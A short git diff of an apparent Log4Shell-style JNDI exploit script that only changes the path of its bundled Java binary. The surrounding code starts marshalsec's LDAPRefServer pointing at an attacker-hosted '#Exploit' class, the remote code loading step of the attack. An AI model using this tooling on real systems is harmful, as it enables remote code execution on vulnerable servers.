@@ -84,7 +84,7 @@ def payload(userip: str, webport: int, lport: int) -> None:
 
 def check_java() -> bool:
     exit_code = subprocess.call([
-        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
+        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java_orig'),
         '-version',
     ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
     return exit_code == 0
@@ -96,7 +96,7 @@ def ldap_server(userip: str, lport: int) -> None:
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run([
-        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
+        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java_orig"),
         "-cp",
         os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
